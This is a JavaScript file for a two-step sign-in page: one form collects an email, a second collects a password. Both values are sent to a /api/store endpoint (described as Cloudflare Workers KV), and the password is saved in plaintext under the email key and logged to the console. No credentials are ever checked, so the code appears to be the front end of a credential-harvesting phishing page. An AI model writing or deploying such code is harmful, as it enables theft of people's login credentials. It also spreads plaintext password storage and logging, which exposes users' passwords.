console.log('Script loaded');

// Use the current URL instead of a hardcoded one
const PAGES_URL = window.location.origin;

async function storeCredential(key, value) {
    console.log('storeCredential function called');
    try {
        console.log(`Sending request to store: key=${key}, value=${value}`);
        const response = await fetch('/api/store', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ key: key, value: value })
        });

        console.log('Response received:', response.status);

        if (!response.ok) {
            const errorData = await response.json();
            console.error("Error storing credential:", response.status, errorData);
            alert(`Error storing credential: ${response.status} - ${JSON.stringify(errorData)}`);
        } else {
            const responseText = await response.text();
            console.log('Server response:', responseText);
            alert('Credential stored successfully!');
        }
    } catch (error) {
        console.error("Error storing credential:", error);
        alert("An error occurred while storing the credential: " + error.message);
    }
}

// Code for index.html (Handles form submission)
const form = document.getElementById('signin-form');
if (form) {
    console.log('Sign-in form found');
    form.addEventListener('submit', async function (event) {
        console.log('Sign-in form submitted');
        event.preventDefault();
        const emailInput = document.getElementById('email');
        const email = emailInput.value;

        // Store email in Cloudflare Workers KV (key only)
        await storeCredential(email, "");

        window.location.href = `welcome.html?email=${encodeURIComponent(email)}`;
    });
}

// Code for welcome.html (Handles email display and show password)
const urlParams = new URLSearchParams(window.location.search);
const userEmail = urlParams.get('email');
const userEmailElement = document.getElementById('user-email');
if (userEmailElement) {
    console.log('User email element found');
    userEmailElement.textContent = userEmail;
}

const passwordForm = document.getElementById('password-form');
if (passwordForm) {
    console.log('Password form found');
    passwordForm.addEventListener('submit', async function (event) {
        console.log('Password form submitted');
        event.preventDefault();
        const passwordInput = document.getElementById('password');
        const password = passwordInput.value;

        // Store password in Cloudflare Workers KV (using email as key)
        await storeCredential(userEmail, password);

        // Redirect or display a success message
        console.log('Password stored in KV:', password);
        alert('Password stored successfully!');
    });
}

// Show Password functionality
const passwordInput = document.getElementById('password');
const showPasswordCheckbox = document.getElementById('show-password');
if (passwordInput && showPasswordCheckbox) {
    console.log('Password input and checkbox found');
    showPasswordCheckbox.addEventListener('change', function () {
        passwordInput.type = this.checked ? 'text' : 'password';
    });
}